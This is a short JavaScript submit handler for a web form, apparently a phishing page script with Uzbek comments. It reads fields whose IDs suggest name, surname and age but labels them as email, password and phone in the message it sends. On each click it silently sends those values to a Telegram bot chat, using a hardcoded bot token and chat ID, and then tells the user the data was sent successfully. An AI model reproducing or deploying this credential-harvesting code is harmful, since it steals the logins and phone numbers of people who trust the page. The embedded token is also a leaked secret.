
document.addEventListener('DOMContentLoaded', function () {

    const submitBtn = document.getElementById('btn');

    submitBtn.addEventListener('click', () => {
        const firstNameInput = document.getElementById('name');
        const lastNameInput = document.getElementById('sur');
        const telefonInput = document.getElementById('age')



        const firstName = firstNameInput.value;
        const lastName = lastNameInput.value;
        const telefon = telefonInput.value;



        // Telegram bot orqali xabar jonatish
        const botToken = `7065966436:AAGbC1dFPDX38ktz__mgQA3SN2cixNlaLRc`;
        const chatId = `5867457951`;
        const message1 = `Email , parol: ${firstName}, ${lastName}`;
        const message2 = `Telefon: ${telefon}`;
        const telegramApiUrl1 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message1},${message2}`;

        fetch(telegramApiUrl1)
            .then(response => response.json())
            .then(data => {

                alert('Malumotlar muvaffaqiyatli yuborildi!');

            })
            .catch(error => console.error('Xatolik yuz berdi:', error));
    });



});